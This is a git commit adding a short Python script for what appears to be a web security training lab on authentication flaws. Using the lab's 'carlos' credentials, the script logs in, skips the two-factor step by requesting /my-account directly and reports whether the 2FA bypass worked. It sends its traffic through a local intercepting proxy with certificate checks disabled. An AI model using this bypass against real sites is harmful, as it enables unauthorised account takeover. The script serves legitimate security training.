b13e5c571a121d856055e33a046547422d318aac
Zentamon <abdulragib36@gmail.com>
2025-03-20 14:15:33 +0530

    auth vulnerability lab 1 and 2 done

---
+++ Authentication vulnerbility labs/lab-02/authentication-lab-02.py
@@ -0,0 +1,35 @@
+import requests
+import sys
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
+
+def access_carlos_account(s,url):
+    #Log into Carlos's account
+    print("[+] Logging into Carlos's account and bypassing 2FA verification...")
+    login_url=url + "/login"
+    login_data = {"username":"carlos","password":"montoya"}
+    r = s.post(login_url,data=login_data,allow_redirects=False,verify=False,proxies=proxies)
+
+    #confirm bypass
+    myaccount_url = url + "/my-account"
+    r =  s.get(myaccount_url, verify=False, proxies=proxies)
+    if "Log out" in r.text:
+        print("[+] Successfully bypassed 2FA verification.")
+    else:
+        print("[-] Exploit Failed.")
+        sys.exit(-1)
+
+def main():
+    if len(sys.argv) !=2:
+        print("[+] Usage: %s <url>" %sys.argv[0])
+        print("[+] Example: %s www.example.com" %sys.argv[0])
+    
+    s = requests.Session()
+    url = sys.argv[1]
+    access_carlos_account(s,url)
+
+if __name__ == '__main__':
+    main()
